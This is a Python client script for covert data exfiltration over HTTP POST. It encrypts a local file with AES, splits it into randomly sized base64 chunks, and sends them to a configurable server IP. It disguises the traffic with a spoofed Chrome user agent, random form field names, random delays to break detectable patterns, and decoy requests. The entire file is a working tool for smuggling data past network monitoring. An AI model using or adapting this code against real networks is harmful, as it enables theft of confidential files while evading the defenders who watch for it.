# 05.07.2023
# Data exfiltration thru HTTP POST.
# Client side

from time import sleep
import requests
import sys
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import logging
import random
from helper import FileHelper as FH
from helper import Helper as Hlp
import hashlib

FileToSend='message.txt'
keyfile='master.key'
dstIP='http://192.168.1.10' # Change this to Server IP

logging.basicConfig(level=logging.INFO)

def genKey(fn):
    key = get_random_bytes(32)
    # Writing key to file,  tags :(r)ead (b)inary
    with open(fn, "wb") as file1:
        file1.write(key)
    return key

def EcryptMsg(msg,key,iv): #encrypt message with AES
    cipher = AES.new(key, AES.MODE_EAX,iv)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode("ISO-8859-1"))
    return ciphertext

def splitIT(msg): # split msg to random
    splitted = []
    prev = 0
    cont=0
    while True:
        n = random.randint(15,25)
        spltmsgdecode=str.encode(str(cont).rjust(10, '0')+'::'+msg[prev:prev+n].decode())
        splitted.append(base64.b64encode(spltmsgdecode))
        prev = prev + n
        cont+=1
        if prev >= len(msg)-1:
            break
    return splitted

def SendHttpPost(url,fuild,text):
    # user_agent for google chrome windows 10
    HDR={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','Accept-Language': 'en-US,en;q=0.5'}
    i=0
    try:
        while i<3: 
            resploop = requests.post(url=url,data={fuild:text},headers=HDR)
            if resploop.status_code == 200:
                i=3 #break loop
            i+=1
        if i==3:
            return False
        else:
            return True
    except:
        logging.error('Error sending post requets')

def GetChecksum(string):
    h = hashlib.new('sha256')
    h.update(string) 
    # print(h.hexdigest())
    return h.hexdigest()

def main():
    # read config file
    confData=Hlp.ReadConfigFile('config.conf')
    fields=confData['Fields'].split(',')
    # read secret text
    msg=FH.ReadFile(FileToSend)
    theKey=genKey(confData['KeyFile'])
    encIV=get_random_bytes(16)
    EncMsg=base64.b64encode(EcryptMsg(msg,theKey,encIV)) #encrypt msg with key and IV
    chmsum=base64.b64encode(str.encode(confData['KeyClose']+'::'+GetChecksum(EncMsg))) #sha256 hash and encode to base64
    tosendSplit=splitIT(EncMsg) #split, insert numbers and encode to base64
    mkeyb64=base64.b64encode(str.encode(confData['KeyOpen']+'::')+encIV) # generate key and encode to base64
    # !! sending process !!
    if not SendHttpPost(dstIP,fields[random.randrange(len(fields))],mkeyb64): # send IV to server
        logging.error('error sending open message'); sys.exit()
    SendHttpPost(dstIP,'FALSE DATA- TESTING','FALSE-FALSE') # send false data for testinfg
    for section in tosendSplit:
        sleep(random.randrange(1,3)) # sleep for random time to break the pathern 
        if not SendHttpPost(dstIP,fields[random.randrange(len(fields))],section): # send chanks
            logging.error('error sending message'); sys.exit()
    if not SendHttpPost(dstIP,confData['KeyClose'],chmsum): # send checksum and close
            logging.error('error sending close message'); sys.exit()
    print ('Client end !!')

if __name__ == "__main__":
    main()
